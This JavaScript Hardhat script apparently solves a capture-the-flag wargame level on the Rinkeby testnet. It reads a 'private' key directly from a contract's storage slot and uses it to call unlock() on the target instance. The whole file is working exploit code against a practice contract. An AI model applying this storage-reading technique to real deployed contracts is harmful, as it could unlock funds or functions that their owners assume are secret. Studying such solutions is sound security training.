const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x2009820Bd25B1cf17E884c10916FABFD9Ad52eA5'
const abi = [
    "function unlock(bytes16 _key) external",
    "function locked() external view returns (bool)"
]

async function hack(contract, signer) {
    // We can access storage directly to figure out the key.
    // Slot 0: Bool; Slot 1: ID; Slot 2: Flattening, Denomination, Awkwardness; Slots 3-5: Data
    // Bytes16 takes final 16 bytes, and Data[2] is Slot 5.
    const provider = ethers.getDefaultProvider('rinkeby');
    let key = (await provider.getStorageAt(contract.address, 5)).slice(0, 34)
    console.log(`Extracted Key: ${key}`);

    const tx = await contract.unlock(key);
    await tx.wait();

    const locked = await contract.locked();
    console.log("Did we unlock?", !locked);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})